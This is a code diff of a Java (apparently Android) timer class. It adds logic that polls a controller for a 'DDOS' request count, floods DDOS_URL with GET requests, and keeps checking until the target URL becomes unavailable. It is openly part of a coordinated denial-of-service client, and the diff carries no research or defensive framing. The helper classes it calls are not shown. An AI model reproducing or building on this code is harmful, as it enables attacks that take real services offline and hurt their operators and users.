@@ -16,15 +16,49 @@ public class TimerContainer extends TimerControllers{
 
 
     //Timers
-    protected static void setTimerToCheckURLAvailability(){
+//    protected static void setTimerToCheckURLAvailability(){
+//
+//        final Timer timer = new Timer();
+//        TimerTask myTask = new TimerTask() {
+//            @Override
+//            public void run() {
+//                MainActivity.setStatusText(">>>>>>>>URLAvailability ran");
+//                if(!checkURLAvailable()) {
+//                    MainActivity.setStatusText("-------------------------------------------");
+//
+//                    timer.cancel();
+//                }
+//
+//            }
+//        };
+//
+//        timer.schedule(myTask, 1000, 1000);//3000
+//    }
 
+
+
+    protected static void setTimerToCheckURLAvailability(){
         final Timer timer = new Timer();
         TimerTask myTask = new TimerTask() {
             @Override
             public void run() {
-                MainActivity.setStatusText(">>>>>>>>URLAvailability ran");
+                System.out.println(">>>>>>>>URLAvailability ran");
+
+                if(!isGETCompleted && isgetCountCalculated){
+
+                    int _DDOSCountForThisClient=0;
+                    _DDOSCountForThisClient=ClientControllerCon.takeNumOfDDOSToBeExcecuted();
+                    if(_DDOSCountForThisClient!=0) {
+                        if(!GETRequestHandlers.sendGets(DDOS_URL, _DDOSCountForThisClient))
+                        {System.out.println("Sending gets to the DDOS URL Failed");
+                            isGETCompleted=true;}
+                        else  isGETCompleted=true;
+                    }
+
+                }
+
                 if(!checkURLAvailable()) {
-                    MainActivity.setStatusText("-------------------------------------------");
+                    System.out.println("-------------------------------------------");
 
                     timer.cancel();
                 }
@@ -32,7 +66,7 @@ public class TimerContainer extends TimerControllers{
             }
         };
 
-        timer.schedule(myTask, 1000, 1000);//3000
+        timer.schedule(myTask, 1000, 1000);
     }
 
 
@@ -59,7 +93,6 @@ public class TimerContainer extends TimerControllers{
 
 
 
-
     protected static void setTimerToCheckServerAvailability(){
         final Timer timer = new Timer();
         TimerTask myTask = new TimerTask() {
@@ -74,6 +107,8 @@ public class TimerContainer extends TimerControllers{
 
         timer.schedule(myTask, 1000, 1000);//4000
     }
+
+
 
 
 
